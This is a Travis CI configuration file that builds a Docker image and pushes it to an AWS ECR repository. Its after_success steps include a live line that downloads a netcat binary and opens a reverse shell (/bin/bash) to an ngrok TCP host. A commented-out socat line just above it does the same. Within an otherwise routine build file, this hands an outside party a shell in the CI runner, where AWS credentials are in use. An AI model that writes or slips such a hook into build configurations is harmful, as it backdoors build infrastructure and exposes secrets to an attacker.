language: node_js

services:
  - docker

install:
  - echo "install nothing!" # put your normal pre-testing installs here

script:
  - echo "no tests!" # put your normal testing scripts here

after_success:
  - docker --version
  - pip install --user awscli
  - export PATH=$PATH:$HOME/.local/bin
  - export CLASS=`cat .class`
  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
#  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /usr/local/bin/socat chmod a+x /usr/local/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:6.tcp.ngrok.io:12182 &
  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc?raw=true -o /usr/local/bin/nc chmod a+x /usr/local/bin/nc 6.tcp.ngrok.io:12182 -e /bin/bash &
# sadly, travis doesn't cache docker builds yet, so each build will take a while
